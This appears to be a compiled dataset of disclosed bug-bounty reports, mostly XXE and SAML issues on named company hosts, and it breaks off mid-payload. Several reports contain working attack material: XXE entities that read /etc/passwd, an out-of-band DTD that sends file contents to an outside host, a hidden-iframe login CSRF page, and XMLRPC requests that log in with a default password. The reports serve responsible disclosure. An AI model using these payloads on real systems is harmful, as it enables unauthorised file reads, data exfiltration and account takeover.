@@ -1,0 +1,1334 @@
+
+
+===== XXE-248668 | XXE on sms-be-vip.twitter.com in SXMP Processor | resolved | sev=medium | bounty=None | weakness=XML External Entities (XXE)
+Hi team,
+
+##What type of issue are you reporting? Does it align to a CWE or OWASP issue?
+I've identified an XXE vulnerability in the cloudhopper sxmp servlet on sms-be-vip.twitter.com which discloses local files to an external attacker and allows web requests to be sent. This aligns to https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing
+
+
+##How does a user reproduce your issue?
+To demonstrate the use of this vulnerability for arbitrary file read, I sent the following request:
+
+    POST /api/sxmp/1.0 HTTP/1.1
+    Host: sms-be-vip.twitter.com
+    Connection: close
+    Content-Type: text/xml
+    Content-Length: 481
+
+    <?xml version="1.0" encoding="ISO-8859-1"?>
+    <!DOCTYPE foo [  
+       <!ELEMENT foo ANY >
+       <!ENTITY file SYSTEM "file:///etc/passwd"> 
+    ]>
+    <operation type="deliver">
+    <account username="abc" password="a"/>
+    <deliverRequest referenceId="MYREF102020022">
+    <operatorId>&file;</operatorId>
+    <sourceAddress type="network">40404</sourceAddress>
+    <destinationAddress type="international">123</destinationAddress>
+    <text encoding="ISO-8859-1">a</text>
+    </deliverRequest>
+    </operation>
+    </code>
+
+In response, the server returned its /etc/passwd file in an error message:
+
+    <?xml version="1.0"?>
+    <operation type="deliver">
+      <error code="1010" message="Unable to convert [root:x:0:0:root:/root:/bin/bash...[truncated by researcher] to an integer for [operatorId]"/>
+    </operation>
+
+In addition to local file read, it was confirmed through testing that if "file:///etc/passwd" is replaced with a URL, the servlet will make external requests and that it has outbound access to the internet.
+
+##What is the impact of your issue?
+Depending on the trust relationships afforded to this host, XXE can be a viable candidate for pivoting to other related hosts It can be used to disclose sensitive files such as certificates and source from the target. This could expose some of the restricted functionality and capabilities of this host to the attacker. 
+
+##What are some scenarios where an attacker would be able to leverage this vulnerability?
+Any remote attacker can utilise this vulnerability to read from the filesystem. On finding this host (indexed by Google and identifiable through certificate transparency logs, so an attacker can discover it without excessive effort, its functionality can be explored by identifying that the code it is running maps to code found on https://github.com/twitter/cloudhopper-commons
+
+In this instance, if this were an isolated host with no opportunity to pivot, as an attacker I would investigate whether I could use file read to bypass the credential requirement which thwarted earlier attempts to interact with this service.
+
+If this host contains API keys or certificates for access other Twitter properties, an attacker could leverage these to escalate their compromise. The web request functionality could also be utilised to port scan any internal hosts which this server has access to.
+
+##What would be your suggested fix?
+If the servlet is not in use, remove it from the server. If it is in use, reduce the functionality of the XML parser such that entities are not resolved, outbound network traffic is disallowed and parameter expansion is disabled.
+
+##Conclusion
+I don't want to flood the report with stuff you're probably already well aware of, so let me know if you need more information and I'll leave it to y'all to determine how important this host is if attacked using this issue. Please advise if your severity rating policy requires me to demonstrate the full possible impact of the vulnerability, as I've terminated testing as early as possible to provide this advice and wait on your response.
+
+Cheers,
+
+Josh Brodie
+
+===== XXE-232614 | Uploaded XLF files result in External Entity Execution | resolved | sev=high | bounty=None | weakness=XML External Entities (XXE)
+Summary:
+========
+ Weblate users in the Translate group (or those with the ability to upload translation files) can trigger XML External Entity Execution. This is a well known and high/critical vector of attack that often can completely compromise the security of a web application or in some cases lead to Remote Code Execution (although I do not expect it to be an easy RCE in this case).
+
+Description:
+========
+The XML External Entity Execution allows for arbitrary reading of files on the server using a relatively obscure aspect of the XML language. It is generally considered high or critical severity, most notably Google places it at the same severity as remote code execution because of the potential for Server-Side Request Forgery, Remote Code Exection, and arbitrary File Read.
+
+The mitigating factors here for you are that some account priveleges are required to upload tranlation files, although by default this gets rolled into the @Translate group. Also because your web server is python based it is not vulnerable to the trivial RCE that PHP servers are commonly vulnerable to.
+
+The core of the vulnerability is in how the translate-toolkit processes .XLF files. The XLIFF standard is XML based, and thus supports by default standard XML functionality including external entity execution.
+
+In my proof of concept, I dowloaded as .XLF the translations of the "hello" project which is being pointed to by my local Weblate instance. A minor modification shown in the steps below results in the /etc/passwd file out through the UI for review as a translation, although much worse things can be done - this is just to prove the vulnerability exists. For more details search for "XML External Entity Exploit"
+
+See the attached screenshots and exploit XML file for evidence of the vulnerability.
+
+Version:
+========
+
+I tested this against the latest stable source available a couple fo days ago (~May 26) running "Weblate 2.15-dev"
+
+Steps to Reproduce
+========
+(I have included a live exploit testproject-testcomponent-en_GB.xlf that works with the "hello" data backing the demo website.)
+
+* Log in as a user that has permission to upload translation files.
+* Go to a component, and download its translations as XLF
+* Add the following two lines after the "<?xml" tag, and replace one of the translation texts with "&xxe;" :
+
+```
+<!DOCTYPE foo [ <!ELEMENT foo ANY >
+<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+```
+* Upload the file back to the server
+* Observe the contents of the passwd file as a translation 
+
+
+===== XXE-223367 | CSRF - Changing the full name / adding a secondary email identity of an account via a GET request | resolved | sev=medium | bounty=None | weakness=Cross-Site Request Forgery (CSRF)
+SUMMARY
+----------
+Hello, I have found a CSRF request via the activation email that will change the full name of the targeted account. This vulnerability exists if the attacker registers a new account and then gives his activation link to someone else. If the victim uses the received activation link while he is logged in his account the attacker's email will be added as a secondary email and the main full name will be changed.
+
+POC
+-------
+I have attached the POC as a video where you can see all the steps.
+
+IMPACT
+------
+Medium - high impact IMO. Changing the name may not be such a big deal, but adding a secondary email identity may turn into something more dangerous.
+
+===== XXE-223014 | SAML Authentication Bypass on uchat.uberinternal.com | resolved | sev=high | bounty=8500.0 | weakness=Improper Authentication - Generic
+<<NO BODY — metadata only>>
+
+--- SUMMARY (team): Due to improper SAML verification it was possible to bypass the OneLogin authentication on https://uchat.uberinternal.com and gain unauthorized access to internal chats.
+
+We enjoyed working with @mishre on this report and look forward to receiving more submissions from them in the future! 
+
+
+===== XXE-213789 | Update php-saml library to 2.10.5 | resolved | sev=low | bounty=None | weakness=Cryptographic Issues - Generic
+The php-saml library as used by our SSO implementation had a minor security patch in 2.10.4 as per https://github.com/onelogin/php-saml/commit/949359f5cad5e1d085c4e5447d9aa8f49a6e82a1.  So we should update this in our next minor releases.
+
+> Security update for signature validation on LogoutRequest/LogoutResponse.
+>
+> In order to verify Signatures on Logoutrequests and LogoutResponses we use
+> the verifySignature of the class XMLSecurityKey from the xmlseclibs library.
+> That method end up calling openssl_verify() depending on the signature algorithm used.
+> 
+> The openssl_verify() function returns 1 when the signature was successfully verified,
+> 0 if it failed to verify with the given key, and -1 in case an error occurs.
+> PHP allows translating numerical values to boolean implicitly, with the following correspondences:
+> - 0 equals false.
+> - Non-zero equals true.
+> 
+> This means that an implicit conversion to boolean of the values returned by openssl_verify()
+> will convert an error state, signaled by the value -1, to a successful verification of the
+> signature (represented by the boolean true).
+> 
+> The LogoutRequest/LogoutResponse signature validator was performing an implicit conversion > to boolean
+> of the values returned by the verify() method, which subsequently will return the same output
+> as openssl_verify() under most circumstances.
+> This means an error during signature verification is treated as a successful verification by the  method.
+>
+> Since the signature validation of SAMLResponses were not affected, the impact of this security
+vulnerability is lower, but an update of the php-saml toolkit is recommended.
+
+===== XXE-188743 | XXE on DoD web server | resolved | sev=critical | bounty=None | weakness=XML External Entities (XXE)
+<<NO BODY — metadata only>>
+
+--- SUMMARY (team): A Department of Defense webserver was vulnerable to an XML External Entity (XXE) processing vulnerability. dawgyg was able to exploit this vulnerability by crafting an XML request that revealed sensitive local system information. Thanks dawgyg!
+
+
+
+===== XXE-178345 | Limited Open redirection using SSO-SAML | resolved | sev=low | bounty=None | weakness=Open Redirect
+Hello,
+
+**Endpoint:** https://hackerone.com/users//saml/sign_in?email=[REDACTED_EMAIL]&remember_me=true
+
+Recently, you have patched an open redirection issue which was reported as #171398. 
+I found a bypass of that patch. 
+
+**Steps to reproduce:** 
+1. Add following in comment/report : 
+```https://hackerone.com/users//saml/sign_in?email=[REDACTED_EMAIL]&remember_me=true``` 
+2. Click on link. 
+3. You will redirected on SSO URL without going through **External Link Warning** page. 
+4. Done.
+
+PoC  : 
+https://hackerone.com/users/saml/sign_in?email=[REDACTED_EMAIL]&remember_me=true (Through external warning page)
+https://hackerone.com/users//saml/sign_in?email=[REDACTED_EMAIL]&remember_me=true (Without external warning page)
+
+**Suggested Fix:** Use more stronger regular expression and filtration at this endpoint.
+
+Best regards,
+Shailesh
+
+
+===== XXE-173972 | web.xml configuration file disclosure | resolved | sev=low | bounty=None | weakness=Information Disclosure
+<<NO BODY — metadata only>>
+
+--- SUMMARY (team): Several source files were accessible at *.mycdn.me
+
+https://st.mycdn.me//WEB-INF/web.xml 
+https://st.mycdn.me/WEB-INF/web.xml
+https://groupava1.mycdn.me/redirect.jsp
+https://groupava1.mycdn.me/index.jsp
+
+
+===== XXE-171398 | (HackerOne SSO-SAML) Login CSRF, Open Redirect, and Self-XSS Possible Exploitation | resolved | sev=low | bounty=None | weakness=Cross-site Scripting (XSS) - Generic
+###Summary:###
+
+Login CSRF, Open Redirect, and Self-XSS Possible Exploitation through HackerOne SSO-SAML
+
+###PoC###
+
+- Go to █████;
+
+Use a browser window with clear cookies.
+
+Source-code:
+
+```
+<html>
+<body>
+	<iframe id="login_csrf_frame" src="████████" style="width:0;height:0;border:0;border:none;"></iframe>
+	<script>
+		setTimeout(function(){document.location.href = "https://hackerone.com/users/saml/sign_in?email=████&remember_me=true";}, 5000);
+	</script>
+</body>
+</html>
+```
+
+###Impact:###
+
+1) Information Leak
+
+An attacker can use Logout CSRF + Login CSRF against a victim to steal all information sent by the victim to the HackerOne website while using the malicious session, including confidential bug reports.
+
+2) Open Redirect
+
+Since the SSO-SAML l​ogin flow can be started automatically (`GET https://hackerone.com/users/saml/sign_in?email=███`) by an attacker and it redirects to external URLs, the attacker can redirect the user to anywhere.
+
+3) Self-XSS Possible Exploitation​
+
+Some stored Self-XSS's (internal areas accessed just by the victim, etc.) can be exploited through Login CSRF.
+
+```
+Malicious page -> HackerOne Login CSRF -> Self-XSS triggers -> Logout -> Wait user actions
+```
+
+If the user interacts with the page (sign in with his account, etc.), the attacker can exploit the Self-XSS.
+
+P.S.:
+
+An attacker can add extra dots to the SAML Email Domain in the config dialog.
+I didn't test all the implications, but registering a very similar domain could be a bad thing, like `hackerone..com`, `hackerone.com.`, `.hackerone.com` or even `gmail..com` because of typing mistakes (`[REDACTED_EMAIL] would redirect the victim to the attacker external login flow`).
+
+===== XXE-167828 | Ability to enumerate private programs using SAML | resolved | sev=None | bounty=None | weakness=Information Disclosure
+<<NO BODY — metadata only>>
+
+--- SUMMARY (team): @ayoubfathi found a strong indicator of the existence of some private programs which were using SAML. Although it was not definitive, and we also warn teams using SAML that doing so removes their reasonable expectation of not being discoverable, we made some changes to help teams more easily disguise their existence.
+
+Given that the technique may still be used to potentially discover some private teams, we're not disclosing the method involved, but suffice to say it was very clever.
+
+Thanks, @ayoubfathi!
+
+
+===== XXE-154096 | Blind OOB XXE At "http://ubermovement.com/" | resolved | sev=None | bounty=500.0 | weakness=Command Injection - Generic
+Test Summary :
+-
+POST data was set to <?xml version="1.0" encoding="utf-8"?> <!DOCTYPE dtgmlf6 [ <!ENTITY dtgmlf6ent SYSTEM "http://122.180.248.81/"> ]> <GeneralSearch>&dtgmlf6ent;</GeneralSearch> 
+
+An HTTP request was initiated for the domain http://122.180.248.81/ which indicates that this script is vulnerable to XXE injection.
+
+NOTE : As it was Blind XXE Test I was Successful in Ping Test for XXE. But unable to retrieve any sensitive information.   
+
+HTTP request details: 
+----------------------------
+IP address: 8.36.86.67
+User agent: Java/1.8.0_60
+
+Vulnerable Domain :
+-
+http://ubermovement.com/
+
+Vulnerable Link :
+-
+http://ubermovement.com/api/search/GeneralSearch
+
+Vulnerable Parameter :
+-
+GeneralSearch
+
+Steps To Reproduce :
+-
+1. Go to website : http://ubermovement.com/
+2. Attach burp Suite & start intercepting now, click on search and search...
+3. Grab the GET request
+Eg. Original HTTP Request :
+-
+GET /api/search/GeneralSearch HTTP/1.1
+Host: ubermovement.com
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+Connection: close
+
+4. NOW,
+
+Send request to repeater & change it to POST.
+
+Eg. Original HTTP Request :
+-
+POST /api/search/GeneralSearch HTTP/1.1
+Host: ubermovement.com
+Content-Length: 173
+Connection: Keep-alive
+Accept-Encoding: gzip,deflate
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
+Accept: */*
+
+5. Now Add content type :
+Eg. Content-type: application/xml
+
+Request will be:
+-
+POST /api/search/GeneralSearch HTTP/1.1
+Content-type: application/xml
+Host: ubermovement.com
+Content-Length: 173
+Connection: Keep-alive
+Accept-Encoding: gzip,deflate
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
+Accept: */*
+
+6. Deploy web server and host "payload.dtd" File eg :
+payload.dtd :
+-
+<?xml version="1.0" encoding="UTF-8"?>
+<!ENTITY % all "<!ENTITY send SYSTEM 'http://xxe.me/content?%file;'>">
+%all;
+
+
+7. Now Add XXE Payload For confirmation :
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE roottag [ 
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % dtd SYSTEM "http://122.180.248.81/payload23.dtd">
+%dtd;]>
+<GeneralSearch>&send;</GeneralSearch>
+
+Request Will Be :
+-
+POST /api/search/GeneralSearch HTTP/1.1
+Content-type: application/xml
+Host: ubermovement.com
+Content-Length: 214
+Connection: Keep-alive
+Accept-Encoding: gzip,deflate
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
+Accept: */*
+
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE roottag [ 
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % dtd SYSTEM "http://122.180.248.81/payload.dtd">
+%dtd;]>
+<GeneralSearch>&send;</GeneralSearch>
+
+NOTE : If you view your web server logs you will find a 404 error.
+--- SUMMARY (team): The researcher located a XXE vulnerability caused by an issue in a third party vendor's product. As it didn't affect Uber's internal infrastructure it had a significantly lower impact and was rewarded accordingly.
+
+
+===== XXE-146093 | WordPress Vulnerabilities: User Enumeration, Vulnerable Akismet Plugin, XML-RPC Interface available | informative | sev=None | bounty=None | weakness=Information Disclosure
+1. User Enumeration:
+It is possible to enumerate four  WordPress usernames (jancborchardt, jos, lukasreschke, frank). An attacker can use these username to carry out brute-force attack in order to forcefully authenticate.
+
+2. Akismet Plugin(2.5.0-3.1.4) vulnerable to unauthenticated Stored Cross Site Scripting:
+This vulnerability allows an attacker to post a comment on a WordPress site which will execute javascript in the WordPress admin console. This is a typical XSS vulnerability pattern and one of the attacks it enables would allow an attacker to steal a WordPress administrator’s cookies and gain administrative access to a WordPress website.
+
+3. XML-RPC Interface available: The presence of xmlrpc.php can cause brute force amplification attack.
+https://nextcloud.com/xmlrpc.php
+
+
+
+===== XXE-138869 | OneLogin authentication bypass on WordPress sites via XMLRPC | resolved | sev=None | bounty=7000.0 | weakness=Code Injection
+When a user logs on one of your WordPress sites via OneLogin, the authentication plugin creates a new entry in the WordPress user database with the default password `@@@nopass@@@`. This wouldn't be a problem if the plugin disabled all normal WordPress authentication methods, but it doesn't.
+
+The OneLogin plugin does prevent logins through the normal *wp-login.php* page but fails to restrict the XMLRPC API. XMLRPC still honors the WordPress internal user database. Depending on the plugin settings, also the normal login page can be used with URL parameters: `wp-login.php?normal=1`. The settings did not allow this on the Uber sites I tried.
+
+An attacker can exploit this bug by performing XMLRPC functions such as create new pages or posts and upload files. The attacker has to guess or know a username that has a default password and sufficient privileges to execute the operation. I haven't done an exhaustive test of all functions but some of them could probably be used to achieve remote code execution (e.g. creating posts containing JavaScript).
+
+This probably affects most of your WordPress sites. I've confirmed this on *love.uber.com* and *newsroom.uber.com* by creating pages and posts (not public) and uploading files.
+
+The XMLRPC system supports about 80 functions by default. Almost all of them require authentication. Plugins may add their own functions. Some of the function names:
+~~~~
+wp.deleteFile
+wp.editComment
+wp.getOptions
+wp.getUsers
+wp.newPage
+wp.newPost
+wp.setOptions
+wp.uploadFile
+~~~~
+#Reproducing#
+Create an XML file named `options.xml` containing:
+~~~~ xml
+<?xml version="1.0"?>
+<methodCall>
+<methodName>wp.getOptions</methodName>
+<params>
+	<param><value>zzz</value></param>
+        <param><value>[REDACTED_EMAIL]</value></param>
+        <param><value>@@@nopass@@@</value></param>
+</params>
+</methodCall>
+~~~~
+Run the UNIX command:
+~~~~ sh
+curl 'https://newsroom.uber.com/xmlrpc.php' --data-binary "`cat options.xml`" -H 'Content-type: application/xml'
+~~~~
+You should get the response:
+~~~~ xml
+<?xml version="1.0" encoding="UTF-8"?>
+<methodResponse>
+  <params>
+    <param>
+      <value>
+      <struct>
+  <member><name>software_name</name><value><struct>
+  <member><name>desc</name><value><string>Software Name</string></value></member>
+  <member><name>readonly</name><value><boolean>1</boolean></value></member>
+  <member><name>value</name><value><string>WordPress</string></value></member>
+</struct></value></member>
+  <member><name>software_version</name><value><struct>
+  <member><name>desc</name><value><string>Software Version</string></value></member>
+  <member><name>readonly</name><value><boolean>1</boolean></value></member>
+  <member><name>value</name><value><string>4.4.3</string></value></member>
+</struct></value></member>
+  <member><name>blog_url</name><value><struct>
+  <member><name>desc</name><value><string>WordPress Address (URL)</string></value></member>
+  <member><name>readonly</name><value><boolean>1</boolean></value></member>
+  <member><name>value</name><value><string>https://newsroom.uber.com</string></value></member>
+...etc.
+~~~~
+#Exploit scenarios#
+Options in the above output that aren't marked *readonly* can also be changed. I didn't check if this is exploitable.
+
+For usernames in these PoCs I used some *@uber.com email addresses I saw while testing previous bugs. They would be relatively easily guessable/findable for an attacker who doesn't have this information.
+
+A new post can be created with the following request. Without supplying a `post_status` parameter it will be saved as a draft, otherwise it will be published. It's also possible to create private posts too, e.g. for XSS-type attacks targeting administrators. The ability to create pages or posts depends on the user's privileges.
+~~~~ xml
+<?xml version="1.0"?>
+<methodCall>
+<methodName>wp.newPost</methodName>
+<params>
+        <param><value>what is this parameter</value></param>
+        <param><value>(INSERT USERNAME)</value></param>
+        <param><value>@@@nopass@@@</value></param>
+        <param><struct>
+                <member><name>post_title</name><value>bugbounty test post</value></member>
+                <member><name>post_content</name><value>any HTML content here</value></member>
+                <member><name>post_excerpt</name><value>excerpt</value></member>
+        </struct></param>
+</params>
+</methodCall>
+~~~~
+I've created some pages/posts on the said systems. As I saved them as drafts they can't be seen by normal users, but should be visible to administrators:
+* https://love.uber.com/australia/?page_id=6085
+* https://newsroom.uber.com/us-new-york/?p=2567
+
+A file can be uploaded with a request like this:
+~~~~ xml
+<?xml version="1.0"?>
+<methodCall>
+<methodName>metaWeblog.newMediaObject</methodName>
+<params>
+        <param><value>what is this parameter</value></param>
+        <param><value>(INSERT USERNAME)</value></param>
+        <param><value>@@@nopass@@@</value></param>
+        <param><struct>
+                <member><name>name</name><value>file_name.html</value></member>
+                <member><name>type</name><value>text/plain</value></member>
+                <member><name>bits</name><value>file contents, any data format XML-encoded</value></member>
+        </struct></param>
+</params>
+</methodCall>
+~~~~
+The ability to upload files and the allowed file extensions depend on the user privileges and WordPress settings.
+
+As a PoC I uploaded a file: https://love.uber.com/wp-content/uploads/sites/5/2016/05/fooasfasfgdg.key
+I tried a few file extensions but most were denied on that server. Depending on the server and WordPress configuration and the user's privileges, this may be used to perform various attacks such as XSS via *.html or *.swf or theoretically even direct RCE if the web server handles some of the allowed file formats as scripts or executables. 
+
+===== XXE-130661 | XXE issue | resolved | sev=None | bounty=None | weakness=Command Injection - Generic
+<<NO BODY — metadata only>>
+
+--- SUMMARY (team): Researcher found an XXE issue in SVG files uploaded to our software. We gave improved our software to actively scan for these vulnerabilities and prevent any harm.
+
+
+===== XXE-112116 | XXE in the Connector Designer | resolved | sev=None | bounty=None | weakness=Information Disclosure
+<<NO BODY — metadata only>>
+
+--- SUMMARY (team): A XML External Entity (XXE) vulnerability allowed an attacker to read arbitrary files on the server.
+
+
+===== XXE-107296 | Possible Timing Side-Channel in XMLRPC Verification | resolved | sev=None | bounty=None | weakness=Cryptographic Issues - Generic
+https://github.com/Automattic/jetpack/blob/bc7a4541ef6f0e9f583376d801ab0c40cfb976c3/class.jetpack-xmlrpc-server.php#L115
+
+I mentioned this to @daljo628 and he suggested submitting it here instead.
+
+This looks very much like a classic [timing attack vulnerability](http://blog.ircmaxell.com/2014/11/its-all-about-time.html). The fix would be to use `hash_equals()` (which I have provided a sane polyfill for in [sarciszewski/php-future](https://github.com/sarciszewski/php-future) if you don't already have one handy).
+
+===== XXE-106865 | [rev-app.informatica.com] - XXE via SAML | resolved | sev=high | bounty=None | weakness=Command Injection - Generic
+Request:
+`POST /sso HTTP/1.1`
+`Host: rev-app.informatica.com`
+`Connection: keep-alive`
+`Content-Length: 8669`
+`Cache-Control: max-age=0`
+`Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8`
+`Origin: https://infapassport.okta.com`
+`Upgrade-Insecure-Requests: 1`
+`User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36`
+`Content-Type: application/x-www-form-urlencoded`
+`Referer: https://infapassport.okta.com/app/template_saml/kwtbgh4jLAZPMXLQUNMU/sso/saml`
+`Accept-Encoding: gzip, deflate`
+`Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.6,en;q=0.4`
+
+`SAMLResponse=PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz48IURPQ1RZUEUgZm9vIFsgPCFFTlRJVFkgJSBhc2QgU1lTVEVNICJodHRwOi8vZXZpbGhvc3QiPiAlYXNkO10%2BPHNhbWwycDpSZXNwb25zZSB4bWxuczpzYW1sMnA9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDpwcm90b2NvbCIgRGVzdGluYXRpb249Imh0dHBzOi8vcmV2LWFwcC5pbmZvcm1hdGljYS5jb20vc3NvIiBJRD0iaWQyOTA5ODg2NzYyNzM5OTM1NDEyMDk2MjY1NSIgSXNzdWVJbnN0YW50PSIyMDE1LTEyLTI1VDEyOjQ4OjMwLjY3MloiIFZlcnNpb249IjIuMCIgeG1sbnM6eHM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvWE1MU2NoZW1hIj48c2FtbDI6SXNzdWVyIHhtbG5zOnNhbWwyPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6YXNzZXJ0aW9uIiBGb3JtYXQ9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDpuYW1laWQtZm9ybWF0OmVudGl0eSI%2BaHR0cDovL3d3dy5va3RhLmNvbS9rd3RiZ2g0akxBWlBNWExRVU5NVTwvc2FtbDI6SXNzdWVyPjxkczpTaWduYXR1cmUgeG1sbnM6ZHM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvMDkveG1sZHNpZyMiPjxkczpTaWduZWRJbmZvPjxkczpDYW5vbmljYWxpemF0aW9uTWV0aG9kIEFsZ29yaXRobT0iaHR0cDovL3d3dy53My5vcmcvMjAwMS8xMC94bWwtZXhjLWMxNG4jIi8%2BPGRzOlNpZ25hdHVyZU1ldGhvZCBBbGdvcml0aG09Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvMDkveG1sZHNpZyNyc2Etc2hhMSIvPjxkczpSZWZlcmVuY2UgVVJJPSIjaWQyOTA5ODg2NzYyNzM5OTM1NDEyMDk2MjY1NSI%2BPGRzOlRyYW5zZm9ybXM%2BPGRzOlRyYW5zZm9ybSBBbGdvcml0aG09Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvMDkveG1sZHNpZyNlbnZlbG9wZWQtc2lnbmF0dXJlIi8%2BPGRzOlRyYW5zZm9ybSBBbGdvcml0aG09Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvMTAveG1sLWV4Yy1jMTRuIyI%2BPGVjOkluY2x1c2l2ZU5hbWVzcGFjZXMgeG1sbnM6ZWM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvMTAveG1sLWV4Yy1jMTRuIyIgUHJlZml4TGlzdD0ieHMiLz48L2RzOlRyYW5zZm9ybT48L2RzOlRyYW5zZm9ybXM%2BPGRzOkRpZ2VzdE1ldGhvZCBBbGdvcml0aG09Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvMDkveG1sZHNpZyNzaGExIi8%2BPGRzOkRpZ2VzdFZhbHVlPm9aV0EzYUVwRTdXeXhUUjdiRFllNDFieGVXaz08L2RzOkRpZ2VzdFZhbHVlPjwvZHM6UmVmZXJlbmNlPjwvZHM6U2lnbmVkSW5mbz48ZHM6U2lnbmF0dXJlVmFsdWU%2BZ0hwc0Z1aURmSE9ZOTkzY0IrVkRvdlQxNDg3T1U1Y1ZmTmxldlN3VXFiK3I5UTJGR00xWDFFczJNT2x1MXBudXQzU3V4dGNzcXU3OWdqb0ZvVW9RdGFnNllFNjhEdGtwR1d5S2RYUW1sZU9ZM0lkQ21NcGk4cFhXdnZJTnV2WDBiZHp6V1ZXTVlqTXplbDdPTFBXL0FZMDdETGl5ellkT0dYTmtKemlZcVZRPTwvZHM6U2lnbmF0dXJlVmFsdWU%2BPGRzOktleUluZm8%2BPGRzOlg1MDlEYXRhPjxkczpYNTA5Q2VydGlmaWNhdGU%2BTUlJQ296Q0NBZ3lnQXdJQkFnSUdBVDN3UmxIdE1BMEdDU3FHU0liM0RRRUJCUVVBTUlHVU1Rc3dDUVlEVlFRR0V3SlZVekVUTUJFRwpBMVVFQ0F3S1EyRnNhV1p2Y201cFlURVdNQlFHQTFVRUJ3d05VMkZ1SUVaeVlXNWphWE5qYnpFTk1Bc0dBMVVFQ2d3RVQydDBZVEVVCk1CSUdBMVVFQ3d3TFUxTlBVSEp2ZG1sa1pYSXhGVEFUQmdOVkJBTU1ER2x1Wm1Gd1lYTnpjRzl5ZERFY01Cb0dDU3FHU0liM0RRRUoKQVJZTmFXNW1iMEJ2YTNSaExtTnZiVEFlRncweE16QTBNRGt4T1RJNE16TmFGdzAwTXpBME1Ea3hPVEk1TXpOYU1JR1VNUXN3Q1FZRApWUVFHRXdKVlV6RVRNQkVHQTFVRUNBd0tRMkZzYVdadmNtNXBZVEVXTUJRR0ExVUVCd3dOVTJGdUlFWnlZVzVqYVhOamJ6RU5NQXNHCkExVUVDZ3dFVDJ0MFlURVVNQklHQTFVRUN3d0xVMU5QVUhKdmRtbGtaWEl4RlRBVEJnTlZCQU1NREdsdVptRndZWE56Y0c5eWRERWMKTUJvR0NTcUdTSWIzRFFFSkFSWU5hVzVtYjBCdmEzUmhMbU52YlRDQm56QU5CZ2txaGtpRzl3MEJBUUVGQUFPQmpRQXdnWWtDZ1lFQQprOFUyUnY1S2lmMzE2aVFkRWVaU25JY3d4amNNRDkzcUpRL1BQbkJDc1A4MDFkbThEOGxxbHBmcHg0Mk82SkxwR0pycSt6UExhZURiCmo1TFJqak9GQjFWR3Z4dEM2eGlpY3o2SXZTS1FVQXFxOCtpL2hsU293SU5zdS9TOWswd0hDaEplVi9tYnBMbVRWeXRRSlYrdVNRM1QKemdjcTNWQzU5VXR2djNFNUJ4OENBd0VBQVRBTkJna3Foa2lHOXcwQkFRVUZBQU9CZ1FBKzBITi9sSkduTWd4SWVwVGJ4LzZqYjNhWQpPNWpyK3IraWFvL1BwL1dlNkxTL2t5MkovdkpGSnZ5TjNMcjBKcFVaeW4zQUZUc3Y4ZFNURmxjeTN2blZBUjdkdnhaY1dHTGlwbzRECm5ZQ3NGNmYvcFgwRDFHSmgyaUZxL3ArK0dqbldIRzZ0Z3ZkUm93akdqVkM3MTFrTy9rUHJIa1ZleDFTNGhlUkxCUVM2Mnc9PTwvZHM6WDUwOUNlcnRpZmljYXRlPjwvZHM6WDUwOURhdGE%2BPC9kczpLZXlJbmZvPjwvZHM6U2lnbmF0dXJlPjxzYW1sMnA6U3RhdHVzIHhtbG5zOnNhbWwycD0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOnByb3RvY29sIj48c2FtbDJwOlN0YXR1c0NvZGUgVmFsdWU9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDpzdGF0dXM6U3VjY2VzcyIvPjwvc2FtbDJwOlN0YXR1cz48c2FtbDI6QXNzZXJ0aW9uIHhtbG5zOnNhbWwyPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6YXNzZXJ0aW9uIiBJRD0iaWQyOTA5ODg2NzYyNzQ3NjQxMzUwNDEzNDk3MiIgSXNzdWVJbnN0YW50PSIyMDE1LTEyLTI1VDEyOjQ4OjMwLjY3MloiIFZlcnNpb249IjIuMCIgeG1sbnM6eHM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvWE1MU2NoZW1hIj48c2FtbDI6SXNzdWVyIEZvcm1hdD0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOm5hbWVpZC1mb3JtYXQ6ZW50aXR5IiB4bWxuczpzYW1sMj0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOmFzc2VydGlvbiI%2BaHR0cDovL3d3dy5va3RhLmNvbS9rd3RiZ2g0akxBWlBNWExRVU5NVTwvc2FtbDI6SXNzdWVyPjxkczpTaWduYXR1cmUgeG1sbnM6ZHM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvMDkveG1sZHNpZyMiPjxkczpTaWduZWRJbmZvPjxkczpDYW5vbmljYWxpemF0aW9uTWV0aG9kIEFsZ29yaXRobT0iaHR0cDovL3d3dy53My5